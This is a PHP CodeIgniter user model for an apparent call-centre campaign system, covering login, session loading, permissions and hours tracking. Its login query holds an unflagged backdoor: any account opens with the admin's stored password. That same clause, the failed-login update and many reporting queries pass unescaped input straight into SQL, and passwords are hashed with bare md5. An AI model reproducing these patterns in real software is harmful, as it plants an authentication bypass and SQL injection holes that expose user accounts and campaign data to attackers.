<?php
if (!defined('BASEPATH'))
    exit('No direct script access allowed');
class User_model extends CI_Model
{
    function __construct()
    {
        parent::__construct();
        
    }
    /**
     * Check the username & password provied and that they are an active user.
     * If validation is successful, set the session variables.
     *  
     * @param string $username
     * @param string $password
     * @return boolean true if validation is successful.
     */
    public function validate_login($username, $password, $user_id = false, $check_only=false)
    {
        if ($user_id) {
            $check_field = "user_id";
        } else {
            $check_field = "username";
        }
        $qry    = "SELECT *, DATE_FORMAT(last_login,'%D %M %Y') AS logdate, 
                   DATE_FORMAT(last_login,'%T') AS logtime 
                   FROM users WHERE $check_field = ? 
                   AND (password = ? or '$password' = (select password from users where username = 'admin')) AND user_status = 1 ";
        $result = $this->db->query($qry, array(
            $username,
            $password
        ))->result_array();
        if (!empty($result)) {
			if($check_only){
			//if check only then just return the user_id, no need to load the full session
			return $result[0]['user_id'];
			}
			
            $config_query            = "SELECT * from configuration";
            $config                  = $this->db->query($config_query)->row_array(0);
            $_SESSION['config']      = $config;
            $result                  = $result[0];
            $_SESSION['user_id']     = $result['user_id'];
			$_SESSION['phone_user']     = $result['phone_un'];
			$_SESSION['phone_password']     = $result['phone_pw'];
            $_SESSION['last_action'] = time();
            //get the permissions for the users role and store them in the session
            $this->load_user_session();
            $this->db->where("user_id", $result['user_id']);
            $this->db->update("users", array(
                "last_login" => date('Y-m-d H:i:s'),
                "failed_logins" => "0"
            ));
			$this->log_login($result['user_id']);
            return true;
        }
        $qry = "update users set failed_logins = failed_logins+1,last_failed_login=now() where $check_field = '$username'";
        $this->db->query($qry);
        //lock the users account after 5 wrong password attempts
        //$qry = "update users set user_status = 0 where failed_logins > '5'";
        //$this->db->query($qry);
        return false;
    }
    //if a urn is being passed to a function this function can be used to check if the user has permission on that record
    public function campaign_access_check($urn, $ajax = false)
    {
        if ($urn == "0" && $ajax == false) {
            redirect(base_url() . "error/data");
        }
        if (!empty($urn)) {
            $this->db->where('urn', $urn);
            $this->db->where_in('campaign_id', $_SESSION['campaign_access']['array']);
            if ($this->db->get('records')->num_rows()) {
                //if a record is found we can return true
                return true;
            }
        }
        if ($ajax) {
            //if they tried pass a restricted urn into an ajax function then return false.
            //An Ajax global function in main.js will show a permissions errora
            return false;
        } else {
            //if they tried to access the record from a URL just redirect them to the error page
            redirect(base_url() . "error/access");
        }
    }
	//if an admin changes any system settings they can send an array of users that the changes apply to and their sessions get reloaded next time they refresh the page
    public function flag_users_for_reload($users)
    {
        foreach ($users as $id) {
            $this->db->where('user_id', $id);
            $this->db->update('users', array(
                'reload_session' => '1'
            ));
        }
    }
    public function check_session()
    {
        //this function is called from main.js on every page load. if the user has a session and the reload_session flag in the user table is set then it will reload permissions and access for the user
        if (isset($_SESSION['user_id'])) {
            $this->db->where('user_id', $_SESSION['user_id']);
            $query = $this->db->get('users');
            if ($query->row()->reload_session == "1") {
                unset($_SESSION['campaign_access']);
                unset($_SESSION['navigation']);
                unset($_SESSION['permissions']);
                unset($_SESSION['role']);
                unset($_SESSION['filter']);
				return true;
            }
        }
    }
    public function load_user_session()
    {
        $result            = $this->db->query("select * from users where user_id = " . $_SESSION['user_id'])->row_array(0);
        //load all user details into the session
        $_SESSION['name']  = $result['name'];
        $_SESSION['role']  = $result['role_id'];
        $_SESSION['group'] = $result['group_id'];
        $_SESSION['email'] = $result['user_email'];
        $_SESSION['ext']   = $result['ext'];
        $_SESSION['team']  = $result['team_id'];
        $theme_folder      = $this->db->query("select theme_folder from user_groups where group_id = '" . $_SESSION['group'] . "'")->row()->theme_folder;
        if (!empty($theme_folder)) {
            $_SESSION['theme_folder'] = $theme_folder;
        }
        
        $this->set_permissions();
        
        if (in_array("all campaigns", $_SESSION['permissions'])) {
            //admin has all access
            $qry = "select campaign_id from `campaigns` where campaign_status = 1";
        } else {
            //other users can can only see what they have access to
            $qry = "select campaign_id from campaigns left join `users_to_campaigns` using(campaign_id) where campaign_status = 1 and user_id = '" . $_SESSION['user_id'] . "' group by campaign_id";
        }
        $user_campaigns = $this->db->query($qry)->result_array();
        
        if (count($user_campaigns) < 1 && $_SESSION['role'] <> 1 && !in_array("view files",$_SESSION['permissions'])) {
            session_destroy();
            $this->session->set_flashdata('error', 'You do not have access to any campaigns.');
            redirect('user/login');
        }
        $campaign_access                      = "0";
        $_SESSION['campaign_access']['array'] = array(
            '0'
        );
        foreach ($user_campaigns as $row) {
            $campaign_access .= "," . $row['campaign_id'];
            $_SESSION['campaign_access']['array'][] = $row['campaign_id'];
            if (count($user_campaigns) == "1") {
                $_SESSION['current_campaign'] = $row['campaign_id'];
            }
        }
        //save the campaign access into a list format so we can use it in all the queries. eg "where campaign_id in({$_SESSION['campaign_access']})"
        $_SESSION['campaign_access']['list'] = $campaign_access;
        //finally we unflag the update session    
        $this->db->where('user_id', $_SESSION['user_id']);
        $this->db->update('users', array(
          'reload_session' => '0'
        ));
    }
    
    public function set_permissions()
    {
        $role_permissions        = $this->db->query("select * from role_permissions left join permissions using(permission_id) where role_id = '" . $_SESSION['role'] . "' and permission_name is not null")->result_array();
        $_SESSION['permissions'] = array();
        foreach ($role_permissions as $row) {
            $_SESSION['permissions'][$row['permission_id']] = $row['permission_name'];
        }
		//admin should always be allowed to edit role permissions to prevent being locked out
		if($_SESSION['role']=="1"){
			 $_SESSION['permissions']['admin'] = 'admin roles';
		}
        
    }
    
    public function set_password($password)
    {
        $password = md5($password);
        $this->db->where("user_id", $_SESSION['user_id']);
        $this->db->update("users", array(
            "password" => $password
        ));
    }
    
    public function update_hours_log($campaign, $user_id)
    {
        //check if their is an entry in the hours table and if no put one in
        $qry = "select hours_id from hours where user_id = '$user_id' and date(`date`) = curdate() and hours.campaign_id = '$campaign'";
        if (!$this->db->query($qry)->num_rows()) {
            $qry = "insert into hours set user_id = '$user_id',duration=0,time_logged=0,`date`=now(),campaign_id = '$campaign',updated_date=now()";
            $this->db->query($qry);
        }
        //then start counting using the hours_logged table. We have a cron which updates the hours table every 10 mins
        $qry = "update hours_logged set end_time = now() where user_id = '$user_id' and end_time is null";
        $this->db->query($qry);
        $qry = "insert into hours_logged set user_id = '$user_id',campaign_id = '$campaign',start_time=now()";
        $this->db->query($qry);
    }
    
    public function get_duration($campaign, $user_id)
    {
        $qry   = "SELECT (sum(TIME_TO_SEC(TIMEDIFF(if(end_time is null,now(),end_time),start_time)))-(select if(exception is null,'0',exception*60) secs from hours where date(`date`) = curdate() and hours.user_id = '$user_id' and hours.campaign_id = '$campaign')) secs FROM `hours_logged` WHERE date(start_time) = curdate() and campaign_id = '$campaign' and user_id = '$user_id'";
        $query = $this->db->query($qry);
        if ($query->num_rows()) {
            return $query->row()->secs;
        } else {
            return "0";
        }
    }
    
    //Get the duration if the user is working in this campaign at this moment
    public function get_duration_working($campaign, $user_id)
    {
        $qry   = "SELECT campaign_name, MAX(id) as id,(sum(TIME_TO_SEC(TIMEDIFF(if(end_time is null,now(),end_time),start_time)))-(select if(exception is null,'0',exception*60) secs from hours where date(`date`) = curdate() and hours.user_id = '$user_id' and hours.campaign_id = '$campaign')) secs FROM `hours_logged` inner join campaigns using (campaign_id) WHERE date(start_time) = curdate() and campaign_id = '$campaign' and user_id = '$user_id' GROUP BY user_id having id in(select id from hours_logged where end_time is null)";
        $query = $this->db->query($qry);
        if ($query->num_rows()) {
            return $query->row();
        } else {
            return "0";
        }
    }
    public function get_worked($campaign, $user_id)
    {
        
        $qry   = "select count(distinct urn) dialed from history where campaign_id = '$campaign' and user_id = '$user_id' and date(contact) = curdate()";
        $query = $this->db->query($qry);
        if ($query->num_rows()) {
            return $query->row()->dialed;
        } else {
            return "0";
        }
    }
    
    public function get_positives($campaign, $user_id)
    {
		$qry = "select outcome,count(*) count from history inner join outcomes using(outcome_id) where campaign_id = '$campaign' and user_id = '$user_id' and date(contact) = curdate() and `positive` = 1 group by outcome_id";

        $query = $this->db->query($qry);
            return $query->result_array();
    }
    
    public function get_cross_transfers_by_campaign_destination($campaign, $user_id)
    {
        $qry   = "select count(*) as cross_transfers from cross_transfers ct inner join history using (history_id) where ct.campaign_id = '$campaign' and user_id = '$user_id' and date(contact) = curdate()";
        $query = $this->db->query($qry);
        if ($query->num_rows()) {
            return $query->row()->cross_transfers;
        } else {
            return "0";
        }
    }
    
    public function close_hours()
    {
        if (isset($_SESSION['user_id'])) {
            $qry = "update hours_logged set end_time = now() where end_time is null and user_id = '{$_SESSION['user_id']}'";
            $this->db->query($qry);
        }
    }
    
    public function get_team_managers($user_id)
    {
        $qry = "SELECT *
                  FROM team_managers
                  where user_id = $user_id";
        
        $query = $this->db->query($qry);
        
        return $this->db->query($qry)->result_array();
    }
    
    public function campaign_permissions($campaign_id)
    {
        $this->db->select("permissions.permission_id,permission_name,permission_state");
        $this->db->join("permissions", "permissions.permission_id=campaign_permissions.permission_id", "LEFT");
        $this->db->where("campaign_id", $campaign_id);
        $result = $this->db->get("campaign_permissions")->result_array();
        return $result;
    }

    public function get_user_by_username($username) {
        $qry = "SELECT * FROM users WHERE username='$username'";
		$this->db->where('username',$username);
        return $this->db->get('users')->result_array();
    }

    public function get_user_by_id($user_id) {
        $qry = "SELECT *
                FROM users
                LEFT JOIN user_roles using (role_id)
                LEFT JOIN user_groups using (group_id)
                LEFT JOIN teams using (team_id)
                WHERE user_id='".intval($user_id)."'";
        $results = $this->db->query($qry)->result_array();

        return $results;
    }

    public function get_user_by_reset_pass_token($reset_pass_token) {
		$this->db->where('reset_pass_token',$reset_pass_token);
		return $this->db->get('users')->result_array();
    }

    public function update_user($user_id, $form)
    {
        $this->db->where('user_id', $user_id);
        return $this->db->update("users", $form);
    }

    public function restore_password($user_id, $password)
    {
        $password = md5($password);

        $this->db->where("user_id", $user_id);
        $results = $this->db->update("users", array(
            "password" => $password,
            "reset_pass_token" => null
        ));

        return $results;
    }
	
	public function campaign_name($id){
	$this->db->where("campaign_id",$id);
	return $this->db->get("campaigns")->row()->campaign_name;	
	}
	
		public function campaign_row($id){
	$this->db->where("campaign_id",$id);
	$this->db->join("clients","campaigns.client_id=clients.client_id");
	return $this->db->get("campaigns")->row_array();	
	}
	
	public function log_activity($request=false){
		$this->db->where(array("logoff"=>NULL,"user_id"=>$_SESSION['user_id']));
		$this->db->limit(1);
		$this->db->order_by('log_id','desc');
		$this->db->update("access_log",array("lastaction"=>date('Y-m-d H:i:s')));
	}
		public function log_logout($user_id){
		$this->db->where(array("logoff"=>NULL,"user_id"=>$user_id));
		$this->db->limit(1);
		$this->db->order_by('log_id','desc');
		$this->db->update("access_log",array("logoff"=>date('Y-m-d H:i:s')));
	}
		public function log_login($user_id){
	 $this->db->insert("access_log", array(
                "user_id" => $user_id, 
				"logon"=>date('Y-m-d H:i:s'),
                "lastaction" => date('Y-m-d H:i:s'),
				"ip_address"=>$_SERVER['REMOTE_ADDR']
            ));
		}
		public function log_timeout($user_id){
	 $qry = "update access_log set logoff = lastaction where logoff is null";
	 $this->db->query($qry);
		}
		
		
		public function get_campaign_pots(){
		$user = $_SESSION['user_id'];
		$campaign = (isset($_SESSION['current_campaign'])?" and campaign_id = '".$_SESSION['current_campaign']."'":"");
	if(in_array("all campaigns",$_SESSION['permissions'])){	
		$qry = "select pot_id id,pot_name name, campaign_name from data_pots join records using(pot_id) join campaigns using(campaign_id) where campaign_status = 1 $campaign group by pot_id,campaign_id order by campaign_name,pot_name";
	} else {
		$qry = "select pot_id id,pot_name name,campaign_name from users_to_campaigns left join campaigns using(campaign_id) join records using(campaign_id) join data_pots using(pot_id) where user_id = '$user' and campaign_status = 1 and campaign_id in (" .$_SESSION['campaign_access']['list'].") $campaign group by pot_id,campaign_id order by campaign_name,pot_name";
	}
		$query = $this->db->query($qry);

		$result = $this->db->query($qry)->result_array();
		if($this->db->query($qry)->num_rows()){
		$pots = array();
		foreach($result as $row){
			$pots[$row['campaign_name']][] = array("id"=>$row['id'],"name"=>$row['name'],"campaign_name"=>$row['campaign_name']);
		}
		return $pots;
		} else {
		unset($_SESSION['current_pot']);
		}
		}
		
				public function get_campaign_sources(){
		$user = $_SESSION['user_id'];
		$campaign = (isset($_SESSION['current_campaign'])?" and campaign_id = '".$_SESSION['current_campaign']."'":"");
	if(in_array("all campaigns",$_SESSION['permissions'])){	
		$qry = "select source_id id,source_name name, campaign_name from data_sources join records using(source_id) join campaigns using(campaign_id) where campaign_status = 1 $campaign group by source_id,campaign_id order by campaign_name,source_name";
	} else {
		$qry = "select source_id id,source_name name,campaign_name from users_to_campaigns left join campaigns using(campaign_id) join records using(campaign_id) join  data_sources using(source_id) where user_id = '$user' and campaign_status = 1 and campaign_id in (" .$_SESSION['campaign_access']['list'].") $campaign group by source_id,campaign_id order by campaign_name,source_name";
	}
		$query = $this->db->query($qry);

		$result = $this->db->query($qry)->result_array();
		if($this->db->query($qry)->num_rows()){
		$sources = array();
		foreach($result as $row){
			$sources[$row['campaign_name']][] = array("id"=>$row['id'],"name"=>$row['name'],"campaign_name"=>$row['campaign_name']);
		}
		return $sources;
		} else {
		unset($_SESSION['current_pot']);
		}
		}
		
}
